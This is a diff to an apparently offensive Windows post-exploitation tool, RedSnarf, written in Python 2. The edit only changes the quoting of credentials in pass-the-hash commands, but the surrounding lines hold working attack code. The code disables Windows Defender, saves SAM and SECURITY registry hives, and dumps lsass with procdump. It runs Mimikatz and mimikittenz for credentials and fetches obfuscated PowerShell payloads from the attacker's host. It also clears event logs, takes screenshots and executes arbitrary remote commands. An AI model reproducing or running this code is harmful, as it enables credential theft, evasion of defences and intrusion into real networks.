@@ -465,7 +465,7 @@ def cps(script,flag,invfunc,funccmd,chost,system):
 			line="Get-MpPreference | fl DisableRealtimeMonitoring"
 			en = b64encode(line.encode('UTF-16LE'))						
 			
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			stdout_value = proc.communicate()[0]
 			if "DisableRealtimeMonitoring : False" in stdout_value:
 				print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
@@ -487,7 +487,7 @@ def cps(script,flag,invfunc,funccmd,chost,system):
 					print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
 					line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
 					en = b64encode(line.encode('UTF-16LE'))						
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 			
 			#Prepare string
 			line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/"+script+"'));"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd
@@ -499,9 +499,9 @@ def cps(script,flag,invfunc,funccmd,chost,system):
 		print colored("[+] Encoding command: "+en,'yellow')
 		
 		if system=="system":
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 		else:
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 		
 		if flag=="AV":
 			#If Windows Defender AV status was on, turn it back on
@@ -510,7 +510,7 @@ def cps(script,flag,invfunc,funccmd,chost,system):
 					print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
 					line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
 					en = b64encode(line.encode('UTF-16LE'))						
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 	
 	except IOError as e:
 		print "I/O error({0}): {1}".format(e.errno, e.strerror) 
@@ -983,7 +983,7 @@ def datadump(user, passw, host, path, os_version):
 		exit(1)
 
 	#Run a whoami on the remote box	
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C whoami \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+	proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C whoami \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 	services = proc.communicate()[0]
 
 	#If reply is not blank
@@ -998,7 +998,7 @@ def datadump(user, passw, host, path, os_version):
 			try:
 				print colored("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host,'green')
 				logging.info("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host)
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")
 
 			except OSError:
 				print colored("[-]Something went wrong here getting reg hives from: "+host,'red')
@@ -1006,12 +1006,12 @@ def datadump(user, passw, host, path, os_version):
 			for f in files:
 				try:
 					print colored("[+]getting: "+f,'yellow')
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
 				except OSError:
 					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
 			try:
 				print colored("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host,'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
 				logging.info("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host)
 
 			except OSError:
@@ -1066,9 +1066,9 @@ def datadump(user, passw, host, path, os_version):
 				fo=open(path+host+"/lsadump","r").read()
 				if "_SC_" in fo:
 					print colored("[+]Checking for services running as users: "+host+"\n",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 					res = os.stat(path+host+"/users.txt").st_size > 3
 					if res==True:
 						try:
@@ -1081,9 +1081,9 @@ def datadump(user, passw, host, path, os_version):
 							print "I/O error({0}): {1}".format(e.errno, e.strerror)
 
 			print colored("\n[+]Checking for logged on users: "+host,'yellow')
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
-			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\logged_on_users.txt\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
+			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\logged_on_users.txt\" 2>/dev/null")
 			res = os.stat(path+host+"/logged_on_users.txt").st_size > 3
 			
 			if res==True:
@@ -1102,7 +1102,7 @@ def datadump(user, passw, host, path, os_version):
 			#Base command wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v taken from
 			#https://www.commonexploits.com/unquoted-service-paths/
 			unquoted=[]
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode |findstr /i \"auto\" \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode |findstr /i \"auto\" \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			services = proc.communicate()[0]	
 						
 			for service in services.splitlines():
@@ -1142,7 +1142,7 @@ def datadump(user, passw, host, path, os_version):
 			#We'll get a list of Windows Services and their paths
 			#wmic service get name,startname,PathName
 			weakservicepermissions=[]
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			services = proc.communicate()[0]		
 			for service in services.splitlines():
 				#If the line does not contain c:\windows
@@ -1194,10 +1194,10 @@ def datadump(user, passw, host, path, os_version):
 				try:
 					print colored("[+]getting dump of lsass: "+host,'green')
 					logging.debug("[+]getting dump of lsass: "+host)
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/lsass.dmp"):
 						print colored("[+]lsass.dmp file found",'green')
 					else:
@@ -1217,11 +1217,11 @@ def datadump(user, passw, host, path, os_version):
 					fout.write('exit\n')
 					fout.close() 
 					
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put a\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\a c:\\mimi.ps1\" 2>/dev/null") 
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"; put a\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\a c:\\mimi.ps1\" 2>/dev/null") 
 					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
 						print colored("[+]mimi_creddump.txt file found",'green')
 						if not os.path.isfile('/usr/bin/iconv'):
@@ -1244,7 +1244,7 @@ def datadump(user, passw, host, path, os_version):
 			if clear_event in events_logs:
 				try:
 					print colored("[+]Clearing event log: "+clear_event,'green')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive wevtutil cl "+clear_event+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive wevtutil cl "+clear_event+"\" 2>/dev/null")
 				except OSError:
 					print colored("[-]Something went wrong clearing "+clear_event+" event log...",'red')
 			else:
@@ -1257,7 +1257,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Running Command: "+xcommand,'green')
 					#Escapes string properly								
 					command = xcommand.encode('string-escape').replace('"', '\\"')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
 					logging.error("[-]Something went wrong running custom command")
@@ -1291,7 +1291,7 @@ def datadump(user, passw, host, path, os_version):
 								#Escapes string properly								
 								command = command.encode('string-escape').replace('"', '\\"')
 
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+								os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 						
 						elif line[0:8]=="[upload]":
 							
@@ -1317,10 +1317,10 @@ def datadump(user, passw, host, path, os_version):
 															
 							if destdir=='none':							
 								print colored("[+]Uploading ",'yellow')+localfile
-								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
 							else:
 								print colored("[+]Uploading ",'yellow')+localfile
-								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+destdir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+destdir+" -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
 
 						elif line[0:10]=="[download]":
 							
@@ -1342,10 +1342,10 @@ def datadump(user, passw, host, path, os_version):
 																						
 							if remotedir=='none':
 								print colored("[+]Downloading ",'yellow')+remfile
-								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
 							else:
 								print colored("[+]Downloading ",'yellow')+remfile
-								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+remotedir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+remotedir+" -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
 							
 							if os.path.isfile(outputpath+host+"/"+remfile):
 								print colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+remfile
@@ -1360,7 +1360,7 @@ def datadump(user, passw, host, path, os_version):
 								#Escapes string properly
 								chkfile = chkfile.encode('string-escape').replace('"', '\\"')
 
-								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
 								if not "bytes free" in stdout_value:
@@ -1379,7 +1379,7 @@ def datadump(user, passw, host, path, os_version):
 								#Escapes string properly
 								chkdir = chkdir.encode('string-escape').replace('"', '\\"')
 
-								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
 								if not "bytes free" in stdout_value:
@@ -1402,7 +1402,7 @@ def datadump(user, passw, host, path, os_version):
 					FunctionCommand = "-Dwmp > c:\\creds.txt"
 
 					#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					stdout_value = proc.communicate()[0]
 					if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
 						print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
@@ -1411,8 +1411,8 @@ def datadump(user, passw, host, path, os_version):
 					
 					cps(shellscript,stealth_mimi,InvokeFunction,FunctionCommand,host,"system")
 						
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
 					
 					
 					if os.path.isfile(outputpath+host+"/creds.txt"):
@@ -1459,7 +1459,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Do not include powershell.exe -NoP -sta -NonI -W Hidden -Enc\n",'yellow')
 					response = raw_input("Please enter the PowerShell String to Execute :- ")
 					if response !="":	
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+response+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+response+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print colored("[+]Launcher Command Sent...",'yellow')
 						
 					print colored("[+]Stopping web server",'green')
@@ -1515,10 +1515,10 @@ def datadump(user, passw, host, path, os_version):
 					line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/b')); cathod > c:\\kittenz_creds.txt"
 					fout.write(line)
 					fout.close()
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimikittenz.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimikittenz.ps1 -Verb RunAs\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get kittenz_creds.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\kittenz_creds.txt c:\\mimikittenz.ps1\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put mimikittenz.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimikittenz.ps1 -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get kittenz_creds.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\kittenz_creds.txt c:\\mimikittenz.ps1\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/kittenz_creds.txt"):
 						print colored("[+]kittenz_creds.txt file found",'green')
 						if not os.path.isfile('/usr/bin/iconv'):
@@ -1602,11 +1602,11 @@ def datadump(user, passw, host, path, os_version):
 						fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
 						fout.close() 
 					
-						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put rsc.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+os.getcwd()+"; put rsc.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						print proc.communicate()[0]
-						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/temp -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						print proc.communicate()[0]
 					
 						if os.path.isfile(outputpath+host+"/"+loggeduser[x]+"_"+host+".png"):
@@ -1614,9 +1614,9 @@ def datadump(user, passw, host, path, os_version):
 						else:
 							print colored("[-]Screenshot not found, try again..",'red')
 
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\windows\\temp\\"+loggeduser[x]+"_"+host+".png\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\windows\\temp\\"+loggeduser[x]+"_"+host+".png\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						print proc.communicate()[0]
